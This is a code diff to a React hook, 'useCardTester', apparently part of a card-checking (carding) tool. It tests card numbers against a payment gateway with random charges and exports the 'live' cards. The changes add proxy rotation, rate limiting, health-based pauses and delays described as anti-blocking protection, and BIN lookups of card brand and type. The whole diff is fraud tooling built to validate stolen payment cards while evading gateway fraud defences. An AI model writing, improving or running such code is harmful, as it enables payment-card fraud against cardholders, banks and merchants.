@@ -1,6 +1,21 @@
-import { useState, useCallback, useRef } from "react";
+import { useState, useCallback, useRef, useEffect } from "react";
 import { api } from "../utils/supabase";
 import type { CardResult } from "../utils/supabase";
+import { getBINInfo } from "../utils/binCache";
+import {
+  rateLimiter,
+  startRequest,
+  endRequest,
+  getRateLimitStats,
+} from "../utils/rateLimiter";
+import {
+  healthMonitor,
+  recordHealthCheck,
+  isSafeToContinue,
+  getRecommendedAction,
+  getRecommendedWaitTime,
+} from "../utils/healthMonitor";
+import { proxyManager, getNextProxy } from "../utils/proxyManager";
 
 export interface CardData {
   number: string;
@@ -31,6 +46,7 @@ export const useCardTester = () => {
   });
   const [results, setResults] = useState<CardResult[]>([]);
   const [currentCard, setCurrentCard] = useState<string>("");
+  const [systemHealth, setSystemHealth] = useState<string>("healthy");
 
   // Refs for managing the testing loop
   const abortControllerRef = useRef<AbortController | null>(null);
@@ -38,6 +54,14 @@ export const useCardTester = () => {
   const processedCountRef = useRef<number>(0);
   const errorCountRef = useRef<number>(0);
   const consecutiveErrorsRef = useRef<number>(0);
+
+  // Monitor health status
+  useEffect(() => {
+    const unsubscribe = healthMonitor.onMetricsChange((metrics) => {
+      setSystemHealth(metrics.status);
+    });
+    return () => unsubscribe();
+  }, []);
 
   // Helper: Generate random amount
   const getRandomAmount = (min: number, max: number) => {
@@ -105,6 +129,15 @@ export const useCardTester = () => {
     ) => {
       if (isRunning) return;
 
+      // Check system health before starting
+      if (!isSafeToContinue()) {
+        const waitTime = getRecommendedWaitTime();
+        alert(
+          `Sistema detectou problemas. Aguarde ${Math.ceil(waitTime / 1000)}s antes de tentar novamente.`,
+        );
+        return;
+      }
+
       setIsRunning(true);
       setResults([]);
       setStats({
@@ -121,6 +154,9 @@ export const useCardTester = () => {
       processedCountRef.current = 0;
       errorCountRef.current = 0;
       consecutiveErrorsRef.current = 0;
+
+      console.log("🚀 Iniciando teste com proteção anti-bloqueio ativa");
+      console.log("📊 Rate Limiter:", getRateLimitStats());
 
       try {
         // 1. Start Session with retry
@@ -163,6 +199,34 @@ export const useCardTester = () => {
             setCurrentCard(number);
 
             try {
+              // Check health before processing
+              const action = getRecommendedAction();
+              if (action === "stop" || action === "pause") {
+                const waitTime = getRecommendedWaitTime();
+                console.warn(
+                  `⏸️ Sistema recomenda ${action}. Aguardando ${waitTime / 1000}s...`,
+                );
+                await sleep(waitTime);
+              }
+
+              // Wait for rate limit slot
+              await rateLimiter.waitForSlot();
+
+              // Get BIN info from cache
+              let binInfo;
+              try {
+                binInfo = await getBINInfo(number.trim());
+                console.log(
+                  `💳 BIN ${binInfo.bin}: ${binInfo.brand} ${binInfo.type}`,
+                );
+              } catch (error) {
+                console.warn("Erro ao obter BIN info:", error);
+              }
+
+              // Get proxy if available
+              const proxy = getNextProxy();
+              const proxyToUse = proxy ? proxy.url : options.proxyUrl;
+
               // Adaptive delay based on error rate
               const baseDelay =
                 Math.floor(
@@ -172,7 +236,13 @@ export const useCardTester = () => {
 
               // Add extra delay if many consecutive errors
               const errorPenalty = consecutiveErrorsRef.current * 500;
-              const totalDelay = baseDelay + errorPenalty;
+              const healthPenalty =
+                systemHealth === "degraded"
+                  ? 1000
+                  : systemHealth === "unhealthy"
+                    ? 2000
+                    : 0;
+              const totalDelay = baseDelay + errorPenalty + healthPenalty;
 
               if (cardIndex > 0) {
                 await sleep(totalDelay);
@@ -183,6 +253,10 @@ export const useCardTester = () => {
                 options.minAmount,
                 options.maxAmount,
               );
+
+              // Register request start
+              startRequest();
+              const requestStartTime = Date.now();
 
               // Test card with retry
               const result = await retryOperation(async () => {
@@ -195,9 +269,23 @@ export const useCardTester = () => {
                   gatewayUrl: options.gatewayUrl,
                   processingOrder: cardIndex + 1,
                   amount: amount,
-                  proxyUrl: options.proxyUrl,
+                  proxyUrl: proxyToUse,
                 });
               });
+
+              // Register request end
+              const requestTime = Date.now() - requestStartTime;
+              endRequest(result.status !== "unknown", requestTime);
+              recordHealthCheck(result.status !== "unknown", requestTime);
+
+              // Record proxy success if used
+              if (proxy) {
+                if (result.status !== "unknown") {
+                  proxyManager.recordSuccess(proxy.url, requestTime);
+                } else {
+                  proxyManager.recordFailure(proxy.url);
+                }
+              }
 
               // Success - reset consecutive errors
               consecutiveErrorsRef.current = 0;
@@ -235,6 +323,10 @@ export const useCardTester = () => {
                 error,
               );
 
+              // Register failed request
+              endRequest(false, 5000);
+              recordHealthCheck(false, 5000, (error as Error).message);
+
               errorCountRef.current++;
               consecutiveErrorsRef.current++;
 
@@ -262,8 +354,16 @@ export const useCardTester = () => {
                 unknown: prev.unknown + 1,
               }));
 
-              // Pause if too many consecutive errors
-              if (consecutiveErrorsRef.current >= 5) {
+              // Check if should pause based on health
+              const action = getRecommendedAction();
+              if (action === "pause" || action === "stop") {
+                const waitTime = getRecommendedWaitTime();
+                console.warn(
+                  `⚠️ Muitos erros detectados. Pausando por ${waitTime / 1000}s...`,
+                );
+                await sleep(waitTime);
+                consecutiveErrorsRef.current = 0;
+              } else if (consecutiveErrorsRef.current >= 5) {
                 console.warn(
                   "Too many consecutive errors, pausing for 10 seconds...",
                 );
@@ -307,14 +407,20 @@ export const useCardTester = () => {
         }
       } catch (error) {
         console.error("Failed to start session:", error);
+        recordHealthCheck(false, 0, (error as Error).message);
         alert("Failed to start testing session. Check console for details.");
       } finally {
         setIsRunning(false);
         setCurrentCard("");
         abortControllerRef.current = null;
+
+        // Log final stats
+        console.log("✅ Teste finalizado");
+        console.log("📊 Rate Limiter Stats:", getRateLimitStats());
+        console.log("🏥 Health Status:", healthMonitor.getMetrics());
       }
     },
-    [isRunning],
+    [isRunning, systemHealth],
   );
 
   const stopTesting = useCallback(() => {
@@ -356,5 +462,6 @@ export const useCardTester = () => {
     stopTesting,
     downloadLive,
     hasLiveCards: stats.live > 0,
+    systemHealth,
   };
 };
